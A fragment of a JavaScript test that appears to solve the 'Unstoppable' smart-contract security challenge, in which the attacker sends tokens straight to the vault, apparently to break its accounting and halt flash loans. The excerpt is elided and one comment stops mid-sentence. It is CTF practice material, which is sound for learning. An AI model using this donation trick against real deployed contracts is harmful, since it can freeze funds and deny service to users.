...
describe('[Challenge] Unstoppable', function () {
    ...
    it('Execution', async function () {
        ...
        // The above line ensures 
        attacker = await ethers.getSigner();
        // await token.transferFrom(attacker.address, vault.address, 10n * 10n ** 18n);
        await token.connect(attacker).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });
